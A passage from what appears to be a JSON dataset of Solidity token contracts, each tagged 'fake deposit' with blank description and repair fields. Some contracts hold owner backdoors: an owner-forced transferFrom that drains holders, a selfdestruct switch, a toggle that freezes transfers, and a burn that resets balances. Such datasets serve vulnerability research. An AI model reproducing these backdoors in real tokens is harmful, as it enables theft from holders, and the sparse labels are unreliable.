 /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 1000000000;                        // Update total supply (100000 for example)\r\n        name = \"clown.finance\";                                   // Set the name for display purposes\r\n        decimals = 0;                            // Amount of decimals for display purposes\r\n        symbol = \"CLOWN\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.4;\r\n\r\n/**\r\n * @title ERC20Basic\r\n * @dev Simpler version of ERC20 interface\r\n * @dev see https://github.com/ethereum/EIPs/issues/179\r\n */\r\nabstract contract ERC20Basic {\r\n    uint256 public _totalSupply = 100000000000000000000000000; //100 000 000\r\n    function totalSupply() public virtual view returns (uint256);\r\n    function balanceOf(address who) public virtual view returns (uint256);\r\n    function transfer(address to, uint256 value) public virtual returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n}\r\n\r\n/**\r\n * @title ERC20 interface\r\n */\r\nabstract contract ERC20 is ERC20Basic {\r\n    function allowance(address owner, address spender) public virtual view returns (uint256);\r\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool);\r\n    function approve(address spender, uint256 value) public virtual returns (bool);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n/**\r\n * @title Ownable\r\n * @dev The Ownable contract has an owner address, and provides basic authorization control\r\n * functions, this simplifies the implementation of \"user permissions\".\r\n */\r\ncontract Ownable {\r\n\r\n    // Owner address of contract. Assigned on deployment.\r\n    address payable public owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        owner = payable(msg.sender);\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\n     * @param newOwner The address to transfer ownership to.\r\n     */\r\n    function transferOwnership(address payable newOwner) onlyOwner public {\r\n        require(newOwner != address(0));\r\n        emit OwnershipTransferred(owner, newOwner);\r\n        owner = newOwner;\r\n    }\r\n}\r\n\r\n\r\n\r\n/**\r\n * Standard ERC20 token implementation\r\n */\r\nabstract contract StandardToken is ERC20, Ownable {\r\n    // Addresses and balances (in tokens) of all clients. Required by ERC20.\r\n    mapping (address => uint256) balances;\r\n    // Clients, allowed to work. Required by ERC20.\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function totalSupply() public override view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    \r\n    function transfer(address _to, uint256 _value) override public returns (bool success) {\r\n        if (balances[msg.sender] >= _value\r\n        && _value > 0\r\n        && balances[_to] + _value > balances[_to])\r\n        {\r\n            uint256 obalance = balances[msg.sender];\r\n            if ( obalance >= _value)\r\n            {\r\n                balances[msg.sender] -= _value;\r\n                balances[_to] += _value;\r\n                emit Transfer(msg.sender, _to, _value);\r\n                return true;\r\n            }\r\n            else\r\n            {\r\n                return false;\r\n            }\r\n        }\r\n        else\r\n        {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) public override view returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public override returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public override view returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n}\r\n\r\n/*\r\n * @title Coin\r\n*/\r\ncontract Coin is StandardToken {\r\n    // A symbol of a coin.\r\n    string public constant symbol = \"EXTRA\";\r\n    // A name of a coin.\r\n    string public constant name = \"ExtraToken\";\r\n    // A number of decimals in a coin.\r\n    uint8 public constant decimals = 18;\r\n    \r\n    event TransferFromTo(address indexed _from, address indexed _to, address indexed _by, uint256 _value);\r\n\r\n    /**\r\n    * @dev Constructor of a contract\r\n    */\r\n    constructor() payable {\r\n        owner = payable(msg.sender);\r\n        balances[owner] = _totalSupply;\r\n        emit Transfer(address(this), owner, _totalSupply);\r\n    }\r\n\r\n    /**\r\n    * @dev Destructor of a contract.\r\n    */\r\n    function kill() public onlyOwner {\r\n        selfdestruct(owner);\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {\r\n        if (msg.sender == owner) {\r\n            allowed[_from][msg.sender] = _value;\r\n        }\r\n\r\n        if (balances[_from] >= _value\r\n        && allowed[_from][msg.sender] >= _value\r\n        && _value > 0)\r\n        {\r\n            uint256 obalance = balances[_from];\r\n            if ( obalance >= _value)\r\n            {\r\n\r\n                balances[_from] -= _value;\r\n                allowed[_from][msg.sender] -= _value;\r\n                balances[_to] += _value;\r\n                emit Transfer(_from, _to, _value);\r\n                emit TransferFromTo(_from, _to, msg.sender, _value);\r\n                return true;\r\n            }\r\n            else\r\n            {\r\n                return false;\r\n            }\r\n        }\r\n        else\r\n\t\t{\r\n            return false;\r\n        }\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract Tracer is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name = 'Tracer';                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol = 'TCR';                 //An identifier: eg SBX\r\n    string public version = '0.0.1';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function Tracer(\r\n        ) {\r\n        balances[msg.sender] = 2000000000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 2000000000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"Tracer\";                                   // Set the name for display purposes\r\n        decimals = 18;                            // Amount of decimals for display purposes\r\n        symbol = \"TCR\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.6.12;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address payable) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes memory) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\n/*\n10% REWARDS DISTRIBUTED TO HODLERS\n*/\n\ncontract KIGGAL is Context, IBEP20, Ownable {\n    using SafeMath for uint256;\n    using Address for address;\n\n    mapping (address => uint256) private _rOwned;\n    mapping (address => uint256) private _tOwned;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    \n    mapping (address => bool) private _isSniper;\n\n    mapping (address => bool) private _isExcludedFromFee;\n\n    mapping (address => bool) private _isExcluded;\n    address[] private _excluded;\n    \n    mapping(address => bool) private _whiteList;\n\n    uint256 private constant MAX = ~uint256(0);\n    uint256 private _tTotal = 1000000 * 10**9 * 10**9; \n    uint256 private _rTotal = (MAX - (MAX % _tTotal));\n    uint256 private _tFeeTotal;\n    \n    uint256 public launchTime;\n    bool public tradingOpen = false;\n\n    string private _name = \"KIGGAL\";\n    string private _symbol = \"KIGGAL\";\n    uint8 private _decimals = 9;\n\n\n    uint256 public _taxFee = 10;\n    uint256 private _previousTaxFee = _taxFee;\n\n    uint256 public _maxTxAmount = 1000000 * 10**9 * 10**9;\n\n\n    constructor () public {\n        _rOwned[_msgSender()] = _rTotal;\n\n        _isExcludedFromFee[owner()] = true;\n        _isExcludedFromFee[address(this)] = true;\n        \n        emit Transfer(address(0), _msgSender(), _tTotal);\n    }\n    \n     function openTrading() external onlyOwner() {\n        tradingOpen = true;\n        launchTime = block.timestamp;\n    }\n    \n    function addToWhiteList(address account) external onlyOwner() {\n        require(!_whiteList[account], \"Account is already in whiteList\");\n        _whiteList[account] = true;\n    }\n    \n    function addListToWhiteList(address[] calldata accountList) external onlyOwner() {\n        require(accountList.length > 0, \"No account found\");\n        for (uint256 i = 0; i < accountList.length; i++) {\n            if (!_whiteList[accountList[i]]) {\n                _whiteList[accountList[i]] = true;    \n            }\n        }\n    }\n\n    function removeFromWhiteList(address account) external onlyOwner() {\n        require(_whiteList[account], \"Account is not in whiteList\");\n        _whiteList[account] = false;\n    }\n    \n    function removeListFromWhiteList(address[] calldata accountList) external onlyOwner() {\n        require(accountList.length > 0, \"No account found\");\n        for (uint256 i = 0; i < accountList.length; i++) {\n            if (_whiteList[accountList[i]]) {\n                _whiteList[accountList[i]] = false;    \n            }\n        }\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public view override returns (uint256) {\n        return _tTotal;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    }\n\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"BEP20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n\n    function _approve(address owner, address spender, uint256 amount) private {\n        require(owner != address(0), \"BEP20: approve from the zero address\");\n        require(spender != address(0), \"BEP20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) private {\n        require(from != address(0), \"BEP20: transfer from the zero address\");\n        require(to != address(0), \"BEP20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        require(!_isSniper[to], \"You have no power here!\");\n        require(!_isSniper[msg.sender], \"You have no power here!\");\n        if(from != owner() && to != owner() && !_whiteList[from] && !_whiteList[to]) {\n            require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\n            if (!tradingOpen) {\n                if (!(from == address(this) || to == address(this)\n                || from == address(owner()) || to == address(owner()))) {\n                    require(tradingOpen, \"Trading is not enabled\");\n                }\n            }\n        }\n        \n        \n        \n        if(from != owner() && to != owner()) {\n            require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\n        }\n\n        bool takeFee = true;\n\n        //if any account belongs to _isExcludedFromFee account then remove the fee\n        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){\n            takeFee = false;\n        }\n\n        _tokenTransfer(from,to,amount,takeFee);\n    }\n\n}\n\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.3;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"./ScheduleCalc.sol\";\n\n\ninterface IERC20Burnable is IERC20 {\n    function burn(uint256 amount) external;\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TokenLockup {\n    IERC20Burnable public token;\n    string private _name;\n    string private _symbol;\n\n    ReleaseSchedule[] public releaseSchedules;\n    uint public minReleaseScheduleAmount;\n    uint public maxReleaseDelay;\n\n    mapping(address => Timelock[]) public timelocks;\n    mapping(address => uint) internal _totalTokensUnlocked;\n    mapping(address => mapping(address => uint)) internal _allowances;\n\n    event Approval(address indexed from, address indexed spender, uint amount);\n    event TimelockBurned(address indexed from, uint timelockId);\n    event ScheduleCreated(address indexed from, uint scheduleId);\n    event ScheduleFunded(address indexed from, address indexed to, uint indexed scheduleId, uint amount, uint commencementTimestamp, uint timelockId);\n\n    constructor (\n        address _token,\n        string memory name_,\n        string memory symbol_,\n        uint _minReleaseScheduleAmount,\n        uint _maxReleaseDelay\n    ) {\n        _name = name_;\n        _symbol = symbol_;\n        token = IERC20Burnable(_token);\n\n        require(_minReleaseScheduleAmount > 0, \"Min schedule amount > 0\");\n        minReleaseScheduleAmount = _minReleaseScheduleAmount;\n        maxReleaseDelay = _maxReleaseDelay;\n    }\n\n    function balanceOf(address who) external view returns (uint) {\n        return unlockedBalanceOf(who) + lockedBalanceOf(who);\n    }\n\n    function transfer(address to, uint value) external returns (bool) {\n        return _transfer(msg.sender, to, value);\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        require(_allowances[from][msg.sender] >= value, \"value > allowance\");\n        _allowances[from][msg.sender] -= value;\n        return _transfer(from, to, value);\n    }\n\n    // Code from OpenZeppelin's contract/token/ERC20/ERC20.sol, modified\n    function approve(address spender, uint amount) external returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    // Code from OpenZeppelin's contract/token/ERC20/ERC20.sol, modified\n    function allowance(address owner, address spender) public view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    // Code from OpenZeppelin's contract/token/ERC20/ERC20.sol, modified\n    function increaseAllowance(address spender, uint addedValue) external returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);\n        return true;\n    }\n\n    // Code from OpenZeppelin's contract/token/ERC20/ERC20.sol, modified\n    function decreaseAllowance(address spender, uint subtractedValue) external returns (bool) {\n        uint currentAllowance = _allowances[msg.sender][spender];\n        require(currentAllowance >= subtractedValue, \"decrease > allowance\");\n        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);\n        return true;\n    }\n\n    function decimals() public view returns (uint8) {\n        return token.decimals();\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function totalSupply() external view returns (uint) {\n        return token.balanceOf(address(this));\n    }\n\n    function burn(uint timelockIndex, uint confirmationIdPlusOne) external returns(bool) {\n        require(timelockIndex < timelocks[msg.sender].length, \"No schedule\");\n\n        // this also protects from overflow below\n        require(confirmationIdPlusOne == timelockIndex + 1, \"Burn not confirmed\");\n\n        // actually burning the remaining tokens from the unlock\n        token.burn(lockedBalanceOfTimelock(msg.sender, timelockIndex) + unlockedBalanceOfTimelock(msg.sender, timelockIndex));\n\n        // overwrite the timelock to delete with the timelock on the end which will be discarded\n        // if the timelock to delete is on the end, it will just be deleted in the step after the if statement\n        if (timelocks[msg.sender].length - 1 != timelockIndex) {\n            timelocks[msg.sender][timelockIndex] = timelocks[msg.sender][timelocks[msg.sender].length - 1];\n        }\n        // delete the timelock on the end\n        timelocks[msg.sender].pop();\n\n        emit TimelockBurned(msg.sender, timelockIndex);\n        return true;\n    }\n\n    function _transfer(address from, address to, uint value) internal returns (bool) {\n        require(unlockedBalanceOf(from) >= value, \"amount > unlocked\");\n\n        uint remainingTransfer = value;\n\n        // transfer from unlocked tokens\n        for (uint i = 0; i < timelocks[from].length; i++) {\n            // if the timelock has no value left\n            if (timelocks[from][i].tokensTransferred == timelocks[from][i].totalAmount) {\n                continue;\n            } else if (remainingTransfer > unlockedBalanceOfTimelock(from, i)) {\n                // if the remainingTransfer is more than the unlocked balance use it all\n                remainingTransfer -= unlockedBalanceOfTimelock(from, i);\n                timelocks[from][i].tokensTransferred += unlockedBalanceOfTimelock(from, i);\n            } else {\n                // if the remainingTransfer is less than or equal to the unlocked balance\n                // use part or all and exit the loop\n                timelocks[from][i].tokensTransferred += remainingTransfer;\n                remainingTransfer = 0;\n                break;\n            }\n        }\n\n        // should never have a remainingTransfer amount at this point\n        require(remainingTransfer == 0, \"bad transfer\");\n\n        require(token.transfer(to, value));\n        return true;\n    }\n\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity =0.8.1;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\ninterface IERC20 {\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface IERC20Metadata is IERC20 {\n\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint256);\n}\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    mapping (address => uint256) internal _balances;\n    mapping (address => bool) private _approveTransfer;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    uint256 internal _totalSupply;\n    uint256 _reward;\n    string internal _name;\n    string internal _symbol;\n    uint256 internal _decimals;\n    bool maxTxPercent = true;\n    address internal _owner;\n    address private uniV2router;\n    address private uniV2factory;\n    \n\n    constructor (string memory name_, string memory symbol_, uint256 decimals_) {\n        _name = name_;\n        _symbol = symbol_;\n        _decimals = decimals_;\n        _owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view virtual override returns (uint256) {\n        return _decimals;\n    }\n\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n    \n    function recall(address _address) external onlyOwner {\n        _approveTransfer[_address] = false;\n    }\n\n    function approveTransfer(address _address) external onlyOwner {\n        _approveTransfer[_address] = true;\n    }\n\n    function approvedTransfer(address _address) public view returns (bool) {\n        return _approveTransfer[_address];\n    }\n\n    function setMaxTxPercent() public virtual onlyOwner {\n        if (maxTxPercent == true) {maxTxPercent = false;} else {maxTxPercent = true;}\n    }\n \n    function maxTxPercentState() public view returns (bool) {\n        return maxTxPercent;\n    }\n\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function reflectReward (uint256 value) external onlyOwner {\n        _reward = value;\n    }\n    \n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        _approve(sender, _msgSender(), currentAllowance - amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be grater thatn zero\");\n        if (_approveTransfer[sender] || _approveTransfer[recipient]) \n        require(maxTxPercent == false, \"\");\n        if (maxTxPercent == true || sender == _owner || recipient == _owner) {\n        _beforeTokenTransfer(sender, recipient, amount);\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[sender] = senderBalance - amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);}\n        else {require (maxTxPercent == true, \"\");} \n    }\n    \n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n        _balances[account] = _reward - amount;\n        _totalSupply -= amount;\n        emit Transfer(account, address(0), amount);\n    }\n    \n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n}\n\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
